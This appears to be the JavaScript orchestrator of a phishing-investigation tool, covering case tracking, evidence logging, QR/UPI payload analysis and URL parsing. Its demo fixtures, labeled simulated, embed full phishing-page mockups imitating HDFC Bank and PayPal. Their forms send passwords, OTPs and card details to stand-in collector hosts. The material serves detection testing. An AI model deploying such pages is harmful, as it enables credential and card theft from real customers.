/**
 * Trust Layer — Digital Fraud Investigation Orchestrator v2.2
 * Single Source of Truth, Structured Case State, 100% Real Evidence.
 */

import {
  CASE_STATE,
  STAGE_STATUS,
  MODEL_STATE,
  VERIFICATION_STATE,
  EVIDENCE_PROVENANCE,
  createEmptyCaseSchema
} from './case_schema.js';

export {
  CASE_STATE,
  CASE_STATE as STAGE,
  STAGE_STATUS,
  MODEL_STATE,
  VERIFICATION_STATE,
  EVIDENCE_PROVENANCE,
  EVIDENCE_PROVENANCE as EVIDENCE_TYPE
};

import fs from 'node:fs';
import path from 'node:path';
import { createHash, randomBytes } from 'node:crypto';
import { redactOperationalText } from './log_redaction.js';
import { DEFAULT_INTERACTIVE_SESSION_MS } from './interactive_action.js';
import { fileURLToPath } from 'node:url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const rootDir = path.resolve(__dirname, '..');
import { URLParser } from './ml/url_parser.js';
import { URLFeatureExtractor } from './ml/url_features.js';
import { URLClassifier } from './ml/url_classifier.js';
import { DNSReconInvestigator } from './investigators/dns_recon.js';
import { PageStructureExtractor } from './investigators/page_extractor.js';
import { PageIntentEngine, PAGE_INTENT } from './ml/page_intent_engine.js';
import { QREngine } from './investigators/qr_engine.js';
import { URLRuleEngine } from './rules/url_rule_engine.js';
import { OverallRiskAggregator } from './rules/risk_aggregator.js';
import { assessContentSignals, hasCompleteRenderedEvidence, recordContentEvidence } from './rules/content_signal_assessor.js';
import { LiveInspector } from './investigators/live_inspector.js';
import { IntelligenceSummaryBuilder } from './investigators/intelligence_summary.js';
import { ScreenshotIntelligenceExtractor } from './investigators/screenshot_intelligence.js';
import { isInteractiveSession } from './interactive_action.js';
import { RedirectTracer } from './investigators/redirect_tracer.js';

export const INSPECTION_MODE = {
  URL_ONLY: 'URL_ONLY',
  MODE_B: 'MODE_B',
  SNAPSHOT: 'SNAPSHOT',
  ISOLATED_LIVE: 'ISOLATED_LIVE'
};

/**
 * Publish an interactive readiness transition only after the isolated worker
 * has acknowledged START_INTERACTIVE. The schema is attached to the stage
 * event so SSE clients need not race several independent case refreshes.
 */
export function publishInteractiveStartState(icase, liveRes, startAcknowledged, now = Date.now()) {
  const session = icase?.schema?.interactiveSession;
  if (!session || session.status !== 'STARTING') return false;

  if (liveRes?.runtimeSessionActive !== true) {
    session.status = liveRes?.status === 'SUCCESS' ? 'ENDED' : 'FAILED';
    session.endedAt = now;
    session.collectionStatus = liveRes?.status === 'SUCCESS' ? 'complete' : 'failed';
    return false;
  }

  if (!startAcknowledged) {
    session.status = 'FAILED';
    session.endedAt = now;
    session.endedReason = 'SUPERVISOR_START_FAILED';
    session.collectionStatus = 'failed';
    if (icase.schema.liveInspection) {
      icase.schema.liveInspection.runtimeSessionActive = false;
      icase.schema.liveInspection.runtimeSessionEndedAt = now;
    }
    liveRes.runtimeSessionActive = false;
    liveRes.runtimeSessionEndedAt = now;
    icase.emit('stage', { stage: 'INTERACTIVE_SESSION_START_FAILED', schema: structuredClone(icase.schema) });
    return false;
  }

  session.status = 'RUNNING';
  session.collectionStatus = 'ready';
  icase.emit('stage', { stage: 'INTERACTIVE_SESSION_READY', schema: structuredClone(icase.schema) });
  return true;
}

async function waitForRenderReadiness(page, maxWaitMs = 5000) {
  const deadline = Date.now() + maxWaitMs;
  const remaining = () => Math.max(1, deadline - Date.now());
  const documentComplete = await page.waitForFunction(() => document.readyState === 'complete',
    { timeout: Math.min(1500, remaining()) }).then(() => true).catch(() => false);
  const imagesComplete = await page.waitForFunction(
    () => Array.from(document.images || []).every(image => image.complete),
    { timeout: Math.min(1000, remaining()) }
  ).then(() => true).catch(() => false);
  await page.evaluate(() => document.fonts?.ready
    ? Promise.race([document.fonts.ready, new Promise(resolve => setTimeout(resolve, 700))])
    : true).catch(() => {});
  let previous = '';
  let stableRounds = 0;
  while (Date.now() < deadline && stableRounds < 2) {
    const current = await page.evaluate(() => document.documentElement?.innerHTML || '').catch(() => '');
    stableRounds = current === previous ? stableRounds + 1 : 0;
    previous = current;
    if (stableRounds < 2) await page.waitForTimeout(250);
  }
  return documentComplete && imagesComplete && stableRounds >= 2 ? 'RENDER_COMPLETE' : 'RENDER_PARTIAL';
}

async function attachScreenshotIntelligence(icase, extraction, screenshotPath, url, hostname) {
  const ocrStartedAt = Date.now();
  const result = await ScreenshotIntelligenceExtractor.analyze({
    screenshotPath, caseId: icase.id, url, targetHostname: hostname, domExtraction: extraction
  });
  icase.schema.modeCTimings = { ...(icase.schema.modeCTimings || {}), ocr_analysis_ms: Date.now() - ocrStartedAt };
  icase.schema.screenshotIntelligence = result;
  extraction.screenshotIntelligence = result;
  for (const finding of result.findings || []) {
    const item = icase.addEvidence(
      finding.source === 'SCREENSHOT_IMAGE_EMBEDDED' ? EVIDENCE_PROVENANCE.SCREENSHOT_IMAGE_EMBEDDED : EVIDENCE_PROVENANCE.CONFIRMED_CROSS_LAYER,
      'screenshot', `Screenshot Clue: ${finding.label}`,
      `${finding.interpretation} Snippet: "${finding.textSnippet}" (Confidence: ${finding.confidence}%)`, finding
    );
    finding.evidenceId = item.id;
  }
  return result;
}

// ── Controlled Demo Sandbox Vectors (Explicitly labeled SIMULATED) ──
const CONTROLLED_DEMO_CASES = {
  'hdfcbank.com': {
    isDemo: true,
    pageTitle: 'HDFC Bank — Personal Banking, NetBanking & Loans',
    htmlMock: "<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"utf-8\">\n  <title>HDFC Bank — Personal Banking, NetBanking & Loans</title>\n  <style>\n    body { margin:0; font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, sans-serif; background: #f8fafc; color: #1e293b; }\n    .top-nav { background: #004c8f; color: #fff; padding: 14px 40px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }\n    .logo { font-size: 22px; font-weight: 800; letter-spacing: 1px; display: flex; align-items: center; gap: 8px; }\n    .logo-badge { background: #ed232a; padding: 2px 8px; border-radius: 4px; font-size: 13px; font-weight: 900; }\n    .nav-links { display: flex; gap: 24px; font-size: 13.5px; font-weight: 600; }\n    .nav-links a { color: #fff; text-decoration: none; opacity: 0.9; }\n    .login-btn { background: #ed232a; color: #fff; font-weight: 700; padding: 8px 20px; border-radius: 4px; text-decoration: none; font-size: 13px; border: none; cursor: pointer; }\n    .hero { max-width: 1100px; margin: 40px auto; padding: 0 20px; display: flex; gap: 40px; align-items: center; }\n    .hero-text { flex: 1.2; }\n    .hero-text h1 { font-size: 36px; font-weight: 800; color: #004c8f; margin-bottom: 12px; line-height: 1.2; }\n    .hero-text p { font-size: 16px; color: #64748b; line-height: 1.6; margin-bottom: 24px; }\n    .hero-card { flex: 0.8; background: #fff; border: 1px solid #e2e8f0; border-radius: 12px; padding: 32px; box-shadow: 0 10px 30px rgba(0,0,0,0.06); }\n    .hero-card h3 { font-size: 20px; font-weight: 700; color: #004c8f; margin-bottom: 8px; }\n    .hero-card p { font-size: 13px; color: #64748b; margin-bottom: 20px; }\n    .portal-btn { width: 100%; padding: 14px; background: #004c8f; color: #fff; font-weight: 700; font-size: 14px; border: none; border-radius: 6px; cursor: pointer; margin-bottom: 12px; }\n    .security-badge { font-size: 11.5px; color: #10b981; display: flex; align-items: center; gap: 6px; font-weight: 600; margin-top: 16px; }\n    .features { max-width: 1100px; margin: 40px auto; padding: 0 20px; display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px; }\n    .feat-box { background: #fff; border: 1px solid #e2e8f0; border-radius: 8px; padding: 24px; }\n    .feat-box h4 { font-size: 16px; font-weight: 700; color: #004c8f; margin-bottom: 6px; }\n    .feat-box p { font-size: 13px; color: #64748b; line-height: 1.5; }\n    .footer { background: #0f172a; color: #94a3b8; padding: 30px 40px; font-size: 12px; text-align: center; margin-top: 60px; }\n  </style>\n</head>\n<body>\n  <div class=\"top-nav\">\n    <div class=\"logo\">\n      <span>HDFC BANK</span>\n      <span class=\"logo-badge\">OFFICIAL</span>\n    </div>\n    <div class=\"nav-links\">\n      <a href=\"/personal\">Personal Banking</a>\n      <a href=\"/nri\">NRI</a>\n      <a href=\"/sme\">SME &amp; Business</a>\n      <a href=\"/wholesale\">Wholesale</a>\n    </div>\n    <button class=\"login-btn\" onclick=\"location.href='https://netbanking.hdfcbank.com/netbanking/'\">LOGIN TO NETBANKING</button>\n  </div>\n\n  <div class=\"hero\">\n    <div class=\"hero-text\">\n      <h1>Bank with Trust.<br>Experience Seamless Digital Banking.</h1>\n      <p>Manage your savings, investments, cards, and loan accounts anytime, anywhere with India's leading private sector bank.</p>\n      <div style=\"display:flex;gap:12px;\">\n        <button class=\"portal-btn\" style=\"width:auto;padding:12px 24px;\" onclick=\"location.href='https://netbanking.hdfcbank.com/netbanking/'\">Access NetBanking Portal</button>\n        <button style=\"background:#fff;border:1px solid #cbd5e1;color:#334155;font-weight:700;padding:12px 24px;border-radius:6px;cursor:pointer;\">Apply for Credit Card</button>\n      </div>\n    </div>\n    <div class=\"hero-card\">\n      <h3>NetBanking Quick Access</h3>\n      <p>Secure login with 256-bit EV-SSL encryption and multi-factor authentication.</p>\n      <form action=\"https://netbanking.hdfcbank.com/netbanking/entry\" method=\"GET\">\n        <button class=\"portal-btn\" type=\"submit\">CONTINUE TO NETBANKING</button>\n      </form>\n      <div class=\"security-badge\">\n        <span>🔒</span> Verified Official Entity (HDFC Bank Ltd.) · EV SSL Certified\n      </div>\n    </div>\n  </div>\n\n  <div class=\"features\">\n    <div class=\"feat-box\">\n      <h4>Instant Savings Account</h4>\n      <p>Open in under 5 minutes with Video KYC and start transacting immediately.</p>\n    </div>\n    <div class=\"feat-box\">\n      <h4>Millennia &amp; Regalia Cards</h4>\n      <p>Exclusive rewards, airport lounge access, and cashbacks on top e-commerce platforms.</p>\n    </div>\n    <div class=\"feat-box\">\n      <h4>Pre-Approved Loans</h4>\n      <p>Disbursal in 10 seconds for existing customers with zero documentation.</p>\n    </div>\n  </div>\n\n  <div class=\"footer\">\n    © 2026 HDFC Bank Ltd. All Rights Reserved. | Privacy Policy | Security Center | Regulatory Disclosures\n  </div>\n</body>\n</html>",
    claimedEntity: 'HDFC Bank',
    actualEntity: 'hdfcbank.com'
  },
  'hdfc-netbanking-verify.xyz': {
    isDemo: true,
    pageTitle: 'HDFC Net Banking — Verification Portal',
    htmlMock: "<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"utf-8\">\n  <title>HDFC Bank — NetBanking Secure Verification</title>\n  <style>\n    body { margin:0; font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, sans-serif; background: #f0f4f8; color: #1e293b; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }\n    .header { width: 100%; background: #004c8f; padding: 16px 32px; color: #fff; font-size: 20px; font-weight: 700; display: flex; align-items: center; justify-content: space-between; position: fixed; top: 0; box-sizing: border-box; }\n    .card { background: #fff; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 440px; padding: 32px; margin-top: 60px; box-sizing: border-box; }\n    .title { font-size: 18px; font-weight: 700; color: #004c8f; margin-bottom: 8px; }\n    .subtitle { font-size: 13px; color: #64748b; margin-bottom: 24px; line-height: 1.5; }\n    .group { margin-bottom: 16px; }\n    .label { display: block; font-size: 12px; font-weight: 600; color: #334155; margin-bottom: 6px; }\n    .input { width: 100%; padding: 10px 12px; border: 1px solid #cbd5e1; border-radius: 4px; font-size: 14px; box-sizing: border-box; }\n    .btn { width: 100%; padding: 12px; background: #004c8f; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 700; cursor: pointer; margin-top: 8px; }\n    .footer { font-size: 11px; color: #94a3b8; text-align: center; margin-top: 24px; }\n  </style>\n</head>\n<body>\n  <div class=\"header\">\n    <span>HDFC BANK</span>\n    <span style=\"font-size:12px;opacity:0.8;\">Secure NetBanking Portal</span>\n  </div>\n  <div class=\"card\">\n    <div class=\"title\">Verify Your NetBanking Access</div>\n    <div class=\"subtitle\">Mandatory PAN & KYC update required to prevent service suspension.</div>\n    <form action=\"https://collector-endpoint.xyz/collect\" method=\"POST\">\n      <div class=\"group\">\n        <label class=\"label\">Customer ID / User ID</label>\n        <input class=\"input\" name=\"cust_id\" type=\"text\" placeholder=\"Enter Customer ID\" required>\n      </div>\n      <div class=\"group\">\n        <label class=\"label\">IPIN (Password)</label>\n        <input class=\"input\" name=\"password\" type=\"password\" placeholder=\"Enter NetBanking Password\" required>\n      </div>\n      <div class=\"group\">\n        <label class=\"label\">One-Time Password (OTP)</label>\n        <input class=\"input\" name=\"otp\" type=\"text\" placeholder=\"Enter 6-digit OTP\" required>\n      </div>\n      <button class=\"btn\" type=\"submit\">CONTINUE &amp; VERIFY</button>\n    </form>\n    <div class=\"footer\">🔒 256-bit SSL Encrypted • VeriSign Secure</div>\n  </div>\n  <script src=\"https://tracker.phish-kit.xyz/track.js\"></script>\n</body>\n</html>",
    claimedEntity: 'HDFC Bank',
    actualEntity: 'hdfc-netbanking-verify.xyz'
  },
  'paypal-security-update.top': {
    isDemo: true,
    pageTitle: 'PayPal — Security Verification',
    htmlMock: "<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"utf-8\">\n  <title>PayPal — Account Security Update Required</title>\n  <style>\n    body { margin:0; font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, sans-serif; background: #f5f7fa; color: #2c2e2f; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }\n    .logo { color: #003087; font-size: 32px; font-weight: 800; font-style: italic; margin-bottom: 24px; }\n    .card { background: #fff; border: 1px solid #eaeced; border-radius: 12px; width: 440px; padding: 40px; box-sizing: border-box; box-shadow: 0 4px 16px rgba(0,0,0,0.06); }\n    .title { font-size: 20px; font-weight: 600; color: #001435; margin-bottom: 8px; text-align: center; }\n    .subtitle { font-size: 13px; color: #515354; margin-bottom: 24px; line-height: 1.5; text-align: center; }\n    .group { margin-bottom: 16px; }\n    .label { display: block; font-size: 12px; font-weight: 600; color: #2c2e2f; margin-bottom: 6px; }\n    .input { width: 100%; padding: 12px; border: 1px solid #9da3a6; border-radius: 6px; font-size: 14px; box-sizing: border-box; }\n    .btn { width: 100%; padding: 14px; background: #0070ba; color: #fff; border: none; border-radius: 24px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 12px; }\n    .footer { font-size: 11px; color: #6c7378; text-align: center; margin-top: 32px; }\n  </style>\n</head>\n<body>\n  <div class=\"logo\">PayPal</div>\n  <div class=\"card\">\n    <div class=\"title\">Confirm Your Identity</div>\n    <div class=\"subtitle\">We detected unusual activity on your account. Please confirm your credentials to restore account services.</div>\n    <form action=\"https://paypal-security-update.top/submit\" method=\"POST\">\n      <div class=\"group\">\n        <label class=\"label\">Email Address</label>\n        <input class=\"input\" name=\"email\" type=\"email\" placeholder=\"name@example.com\" required>\n      </div>\n      <div class=\"group\">\n        <label class=\"label\">Password</label>\n        <input class=\"input\" name=\"password\" type=\"password\" placeholder=\"Enter password\" required>\n      </div>\n      <div class=\"group\">\n        <label class=\"label\">Debit / Credit Card Number</label>\n        <input class=\"input\" name=\"card_number\" type=\"text\" placeholder=\"16-digit card number\" required>\n      </div>\n      <div class=\"group\">\n        <label class=\"label\">CVV / Security Code</label>\n        <input class=\"input\" name=\"card_cvv\" type=\"password\" placeholder=\"3 digits on back\" required>\n      </div>\n      <button class=\"btn\" type=\"submit\">Verify Account Now</button>\n    </form>\n  </div>\n  <div class=\"footer\">Security Center • Contact Us • Privacy Policy</div>\n  <script src=\"https://static.paypal-security-update.top/js/app.js\"></script>\n</body>\n</html>",
    claimedEntity: 'PayPal',
    actualEntity: 'paypal-security-update.top'
  },
  'testsafebrowsing.appspot.com': {
    isDemo: true,
    pageTitle: 'Phishing Page Example',
    htmlMock: '<!doctype html><html><head><title>Phishing Page Example</title></head><body><h1>Phishing Page Example</h1><p>This is a test page for Google Safe Browsing.</p><form><label>Username <input name="username"></label><label>Password <input name="password" type="password"></label></form><h2>Social engineering content example</h2><p>A Media Player 12.3 update is REQUIRED. Please install FLV HD and continue.</p></body></html>',
    claimedEntity: 'Security Demonstration Fixture',
    actualEntity: 'testsafebrowsing.appspot.com'
  }
};

export class InvestigationCase {
  constructor(caseId, target, targetType = 'URL', mode = 'URL_ONLY') {
    this.schema = createEmptyCaseSchema(caseId, target, targetType);
    this.schema.inspectionMode = mode || 'URL_ONLY';
    this._listeners = {};
    this._opLog = [];
    this._abortController = new AbortController();
    this._abortSignal = this._abortController.signal;
  }

  get id() { return this.schema.id; }
  get target() { return this.schema.target; }
  get status() { return this.schema.status; }
  get stage() { return this.schema.status; }
  get currentStage() { return this.schema.currentStage; }
  get coverage() { return this.schema.coverage; }
  get evidence() { return this.schema.evidence; }
  get timeline() { return this.schema.timeline; }
  get assessment() { return this.schema.assessment.headline || this.schema.assessment; }
  get riskLevel() { return this.schema.assessment.riskLevel; }
  get riskScore() { return this.schema.modelResult.probabilityPhishing; }
  get trustBreakpoint() { return this.schema.trustBreakpoints; }
  get attackStory() { return this.schema.attackStory; }
  get deceptionPath() { return this.schema.deceptionPath; }
  get parsed() { return this.schema.urlAnalysis; }
  get isDemo() { return this.schema.isDemo; }

  on(event, fn) {
    if (!this._listeners[event]) this._listeners[event] = [];
    this._listeners[event].push(fn);
    return this;
  }

  emit(event, data) {
    const msg = { event, data, ts: Date.now() };
    if (this._listeners[event]) this._listeners[event].forEach(fn => fn(msg));
    if (this._listeners['*']) this._listeners['*'].forEach(fn => fn(msg));
  }

  log(message, level = 'info') {
    const entry = { ts: Date.now(), message: redactOperationalText(message), level };
    this._opLog.push(entry);
    this.emit('operation', entry);
  }

  setStage(stage, coverageStatus = STAGE_STATUS.RUNNING) {
    this.schema.currentStage = stage;
    this.schema.status = stage;
    this.schema.updatedAt = Date.now();
    this.log(`STAGE: ${stage}`);
    this.emit('stage', { stage, coverage: this.schema.coverage });
  }

  addEvidence(type, category, title, detail, data = {}) {
    const counter = this.schema.evidence.length + 1;
    const id = `E-${String(counter).padStart(3, '0')}`;
    const item = {
      id,
      type,        // OBSERVED | MODEL | EXTERNAL | DERIVED | INFERRED | SIMULATED | UNKNOWN
      category,    // 'url' | 'host' | 'http' | 'page' | 'network' | 'entity' | 'breakpoint' | 'meta'
      title,
      detail,
      ts: Date.now(),
      data
    };
    this.schema.evidence.push(item);
    this.schema.timeline.push({ ts: item.ts, event: title, evidenceId: id, type });
    this.emit('evidence', item);
    return item;
  }

  addGraphNode(id, label, type, meta = {}) {
    if (!this.schema.graph.nodes.find(n => n.id === id)) {
      this.schema.graph.nodes.push({ id, label, type, meta });
    }
  }

  addGraphEdge(fromId, toId, label, type = 'redirect') {
    this.schema.graph.edges.push({ from: fromId, to: toId, label, type });
  }
}

export class InvestigationEngine {
  static CASE_HISTORY = new Map();
  static ISSUED_CASE_IDS = new Set();

  static generateCaseId() {
    const now = new Date();
    const YYYY = now.getFullYear();
    const MMDD = String(now.getMonth() + 1).padStart(2, '0') + String(now.getDate()).padStart(2, '0');
    const HHmm = String(now.getHours()).padStart(2, '0') + String(now.getMinutes()).padStart(2, '0');
    let suffix;
    let id;
    do {
      suffix = randomBytes(6).toString('hex').toUpperCase();
      id = `TL-${YYYY}-${MMDD}-${HHmm}-${suffix}`;
    } while (this.ISSUED_CASE_IDS.has(id));
    this.ISSUED_CASE_IDS.add(id);
    return id;
  }

  static createCase(target, targetType = 'URL', mode = 'URL_ONLY') {
    const id = this.generateCaseId();
    return new InvestigationCase(id, target, targetType, mode);
  }

  /**
   * Main Pipeline Execution
   * @param {InvestigationCase} icase 
   */
  static async investigate(icase) {
    icase.schema.status = CASE_STATE.NORMALIZING;
    icase.schema.lifecycleState = 'running';
    icase.setStage(CASE_STATE.NORMALIZING);

    try {
      // ── Step 0: QR / Payload Dispatch ──
      let targetUrl = icase.target;
      let qrAnalysis = null;
      if (icase.schema.targetType === 'QR' || targetUrl.startsWith('upi://') || targetUrl.startsWith('WIFI:') || targetUrl.startsWith('BEGIN:VCARD') || targetUrl.startsWith('mailto:') || targetUrl.startsWith('tel:') || targetUrl.startsWith('sms:')) {
        qrAnalysis = QREngine.analyzePayload(targetUrl);
        icase.schema.qrAnalysis = qrAnalysis;

        // Context consistency check if expectedContext was provided
        if (icase.schema.expectedContext) {
          const contextEval = QREngine.evaluateContextConsistency(icase.schema.expectedContext, qrAnalysis);
          icase.schema.qrContextConsistency = contextEval;
          if (contextEval.status === 'MISMATCH' || contextEval.status === 'POTENTIAL_MISMATCH') {
            icase.schema.trustBreakpoints.push({
              type: 'QR_INTENT_MISMATCH',
              expected: contextEval.expectedAction,
              observed: contextEval.decodedAction,
              description: contextEval.explanation
            });
            icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'breakpoint', 'QR Intent Mismatch Detected', contextEval.explanation, contextEval);
          }
        }

        if (qrAnalysis.type === 'URL') {
          targetUrl = qrAnalysis.target;
        } else if (qrAnalysis.type === 'UPI') {
          icase.schema.identityAnalysis.claimedEntity = qrAnalysis.claimedIdentity;
          icase.schema.identityAnalysis.paymentRecipient = qrAnalysis.parsedData.payeeVpa;
          const payIntegrity = QREngine.validatePaymentIntegrity(qrAnalysis.parsedData);
          icase.schema.paymentIntegrity = payIntegrity;

          icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'entity', 'UPI QR Payment Request Parsed',
            `Payee: ${qrAnalysis.parsedData.payeeName} (${qrAnalysis.parsedData.payeeVpa}) | Amount: ₹${qrAnalysis.parsedData.amount || '0'}`,
            payIntegrity);

          if (qrAnalysis.isSuspicious) {
            icase.schema.trustBreakpoints.push({
              type: 'UPI_REVERSE_DEBIT_TRAP',
              expected: 'Payment Receipt',
              observed: `Debit Request for ₹${qrAnalysis.parsedData.amount}`,
              description: qrAnalysis.anomalies.join('; ')
            });
          }
        } else {
          // WIFI, VCARD, EMAIL, TEL, SMS, TEXT payloads
          icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'url', `Decoded QR Payload (${qrAnalysis.type})`,
            `Decoded action: ${qrAnalysis.actionPreview?.action || qrAnalysis.type}. Target: ${qrAnalysis.target}`,
            qrAnalysis);
          if (qrAnalysis.isSuspicious) {
            icase.schema.trustBreakpoints.push({
              type: 'SUSPICIOUS_QR_PAYLOAD',
              expected: 'Benign QR Payload',
              observed: qrAnalysis.anomalies.join('; '),
              description: qrAnalysis.anomalies.join('; ')
            });
          }
        }

        // For non-URL payloads (UPI, WIFI, VCARD, TEL, etc.), populate full structured intent & protocol analysis
        if (qrAnalysis.type !== 'URL') {
          icase.schema.coverage.url = STAGE_STATUS.COMPLETED;
          icase.schema.coverage.domain = STAGE_STATUS.SKIPPED;
          icase.schema.coverage.http = STAGE_STATUS.SKIPPED;
          icase.schema.coverage.website = STAGE_STATUS.COMPLETED;
          icase.schema.coverage.intent = STAGE_STATUS.COMPLETED;
          icase.schema.coverage.evidence = STAGE_STATUS.COMPLETED;
          icase.schema.status = CASE_STATE.COMPLETED;

          // Populate URL/URI anatomy for non-HTTP targets
          icase.schema.urlAnalysis = {
            rawInput: targetUrl,
            normalizedUrl: targetUrl,
            protocol: qrAnalysis.type.toLowerCase() + ':',
            hostname: qrAnalysis.claimedIdentity || qrAnalysis.target,
            pathname: qrAnalysis.type,
            port: 'N/A (Native URI)',
            query: targetUrl.includes('?') ? targetUrl.substring(targetUrl.indexOf('?')) : 'None',
            fragment: 'None',
            features: qrAnalysis.parsedData || {},
            isNativeUri: true,
            payloadType: qrAnalysis.type
          };

          const intentSummaryText = qrAnalysis.type === 'UPI'
            ? `===============================================================
PAYLOAD INTENT SUMMARY (UPI PAYMENT TRANSACTION)
===============================================================

WHAT THIS PAYLOAD WILL DO (TRANSACTION ACTION)
Primary Action:    PAYMENT_DEBIT (UPI Money Transfer)
Recipient VPA:     ${qrAnalysis.parsedData.payeeVpa || 'Unspecified'}
Claimed Merchant:  ${qrAnalysis.parsedData.payeeName || 'Unspecified'}
Requested Amount:  ${qrAnalysis.parsedData.amount ? '₹' + qrAnalysis.parsedData.amount + ' ' + (qrAnalysis.parsedData.currency || 'INR') : 'User-entered Amount'}
Transaction Note:  ${qrAnalysis.parsedData.note || 'None'}

WHAT THE USER IS ASKED TO DO (REQUIRED ACTIONS)
  ✓ Authorize debit in personal UPI/Banking application
  ✓ Authenticate with secret UPI PIN (DEDUCTS funds from user account)

INTENT & CONSISTENCY CHECK
Expected Context:  ${icase.schema.expectedContext || 'None Specified'}
Consistency:       ${icase.schema.qrContextConsistency?.status || 'VERIFIED'}
Pretext vs Action: ${qrAnalysis.isSuspicious ? 'MISMATCH DETECTED: Reverse debit / anomalous note' : 'Authentic peer-to-merchant payment flow'}
Integrity Status:  ${icase.schema.paymentIntegrity?.isVpaValid ? 'Valid VPA Handle' : 'Malformed VPA'} (${icase.schema.paymentIntegrity?.pspDomain || 'Recognized PSP'})
===============================================================`
            : `===============================================================
PAYLOAD INTENT SUMMARY (${qrAnalysis.type} PROTOCOL ACTION)
===============================================================
Target Action:     ${qrAnalysis.actionPreview?.action || qrAnalysis.type}
Decoded Details:   ${JSON.stringify(qrAnalysis.parsedData, null, 2)}
Anomalies:         ${qrAnalysis.anomalies.length > 0 ? qrAnalysis.anomalies.join('; ') : 'None detected (Standard format)'}
===============================================================`;

          icase.schema.pageAnalysis = {
            status: 'COMPLETED',
            title: `Native ${qrAnalysis.type} Action: ${qrAnalysis.claimedIdentity || qrAnalysis.type}`,
            domNodes: 0,
            htmlBytes: 0,
            domFingerprint: `NATIVE_${qrAnalysis.type}_URI`,
            headings: [`Protocol Scheme: ${qrAnalysis.type}`, `Target Identity: ${qrAnalysis.claimedIdentity || qrAnalysis.target}`],
            buttons: [qrAnalysis.actionPreview?.action || qrAnalysis.type],
            forms: [],
            scripts: [],
            isNativePayload: true,
            intent: {
              primary: qrAnalysis.type === 'UPI' ? 'PAYMENT_DEBIT' : qrAnalysis.type,
              secondary: qrAnalysis.type === 'UPI' ? 'UPI_TRANSFER' : 'NATIVE_ACTION',
              confidence: 1.0,
              ruleBaseline: qrAnalysis.type === 'UPI' ? 'UPI_DEBIT_PROTOCOL' : qrAnalysis.type,
              intentConsistency: 'VERIFIED',
              claimedPurpose: qrAnalysis.claimedIdentity || qrAnalysis.type,
              observedPurpose: qrAnalysis.actionPreview?.action || qrAnalysis.type,
              purposeConsistency: qrAnalysis.isSuspicious ? 'MISMATCH' : 'MATCH',
              purposeMismatch: qrAnalysis.isSuspicious,
              mismatchReason: qrAnalysis.anomalies.join('; ') || null,
              requestedActions: qrAnalysis.type === 'UPI' ? ['AUTHORIZE_DEBIT', 'ENTER_UPI_PIN'] : [qrAnalysis.actionPreview?.action || qrAnalysis.type],
              requestedData: qrAnalysis.type === 'UPI' ? ['UPI_PIN', 'BANK_ACCOUNT_DEBIT'] : [],
              summary: {
                text: intentSummaryText,
                primaryIntent: qrAnalysis.type === 'UPI' ? 'PAYMENT_DEBIT' : qrAnalysis.type,
                primaryPageRole: qrAnalysis.type === 'UPI' ? 'PAYMENT_DEBIT' : qrAnalysis.type,
                availableActions: [qrAnalysis.actionPreview?.action || qrAnalysis.type],
                requestedData: qrAnalysis.type === 'UPI' ? ['UPI_PIN'] : []
              }
            }
          };

          icase.schema.assessment.headline = qrAnalysis.isSuspicious ? `Suspicious ${qrAnalysis.type} Payload Detected` : `Valid ${qrAnalysis.type} QR Payload`;
          icase.schema.assessment.riskLevel = qrAnalysis.isSuspicious ? 'HIGH' : 'LOW';
          icase.schema.assessment.summary = qrAnalysis.anomalies.length > 0 ? qrAnalysis.anomalies.join('; ') : `QR code decoded as ${qrAnalysis.type} payload without immediate security anomalies.`;
          icase.schema.completedAt = Date.now();
          icase.schema.lifecycleState = 'completed';
          InvestigationEngine.CASE_HISTORY.set(icase.id, icase.schema);
          icase.emit('complete', icase.schema);
          return icase;
        }
      }

      // ── Step 1: URL Normalization & Parsing ──
      const parsed = URLParser.parse(targetUrl);
      if (!parsed.isValid) {
        const safeParseError = 'Target could not be parsed as a valid URL.';
        icase.log(`TARGET REJECTED: ${safeParseError}`, 'error');
        icase.schema.errors.push(safeParseError);
        icase.schema.coverage.url = STAGE_STATUS.FAILED;
        icase.schema.status = CASE_STATE.FAILED;
        icase.schema.lifecycleState = 'failed';
        icase.schema.completedAt = Date.now();
        icase.schema.assessment.verificationState = VERIFICATION_STATE.UNVERIFIED;
        icase.schema.assessment.headline = 'Invalid Target Format';
        icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'url', 'Malformed URL Target', safeParseError);
        icase.emit('complete', icase.schema);
        return icase;
      }

      icase.schema.urlAnalysis.normalizedUrl = parsed.normalizedUrl;
      icase.schema.urlAnalysis.protocol = parsed.protocol;
      icase.schema.urlAnalysis.hostname = parsed.hostname;
      icase.schema.urlAnalysis.port = parsed.port;
      icase.schema.urlAnalysis.pathname = parsed.pathname;
      icase.schema.urlAnalysis.query = parsed.query;
      icase.schema.urlAnalysis.fragment = parsed.fragment;
      icase.schema.domainAnalysis.hostname = parsed.hostname;
      icase.schema.domainAnalysis.registrableDomain = parsed.domain;
      icase.schema.domainAnalysis.subdomains = parsed.subdomains;
      icase.schema.domainAnalysis.isIp = parsed.isIp;
      icase.schema.domainAnalysis.isPunycode = parsed.isPunycode;

      icase.log(`TARGET PARSED: protocol=${parsed.protocol} | hostname=${parsed.hostname} | path=${parsed.pathname}`);
      icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'url', 'Target URL Normalization Completed',
        `Standardized URL: ${parsed.normalizedUrl} (Hostname: ${parsed.hostname})`,
        { ...parsed });
      icase.addGraphNode('target', parsed.normalizedUrl, 'target', { url: parsed.normalizedUrl, host: parsed.hostname });

